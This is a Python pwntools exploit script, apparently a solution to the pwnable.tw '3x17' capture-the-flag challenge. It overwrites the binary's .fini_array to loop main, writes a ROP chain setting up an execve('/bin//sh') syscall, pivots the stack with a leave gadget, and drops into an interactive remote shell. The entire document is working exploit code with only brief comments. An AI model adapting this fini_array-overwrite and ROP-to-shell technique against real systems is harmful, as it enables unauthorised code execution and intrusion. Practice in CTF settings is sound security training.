from pwn import *
import sys

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

writable = 0x4b4000
fini_array = 0x4b40f0
main = 0x00401b6d
call_fini_array = 0x402960

# rop gadgets
pop_rsi = 0x406c30
pop_rax = 0x41e4af
mov_qword_rsi = 0x47c1b1 # mov qword ptr [rsi], rax; ret
xor_rax_rax = 0x442110
pop_rdi = 0x401696
pop_rdx = 0x446e35
add_rax_1 = 0x471810
syscall = 0x471db5
leave = 0x401c4b

# rop chain
# data = 0x4b4000

# io = process('./3x17')
io = remote('chall.pwnable.tw', 10105)

gdbscript = 'break *0x00401bb0\n'  # lea rsi, str.addr
gdbscript += 'x/20xg $rsp\n'
gdb.attach(io, gdbscript)

def writeData(addr, buf):
    global io
    io.sendlineafter('addr:', str(addr))
    io.sendafter('data:', buf)

# create infinity loop
writeData(fini_array, p64(call_fini_array) + p64(main))

start_rop_addr = 0x4b4100

# rdi -> '/bin//sh'
writeData(start_rop_addr, p64(pop_rsi) + p64(writable))
writeData(start_rop_addr + 8*2, p64(pop_rax) + '/bin//sh')
writeData(start_rop_addr + 8*4, p64(mov_qword_rsi))
writeData(start_rop_addr + 8*5, p64(pop_rdi) + p64(writable))
# rsi = 0
writeData(start_rop_addr + 8*7, p64(pop_rsi) + p64(0))
# rdx = 0
writeData(start_rop_addr + 8*9, p64(pop_rdx) + p64(0))
# rax = 59 sys_execve
writeData(start_rop_addr + 8*11, p64(pop_rax) + p64(59))
# syscall
writeData(start_rop_addr + 8*13, p64(syscall))

# trigger rop chain
writeData(fini_array, p64(leave) + p64(main))

io.interactive()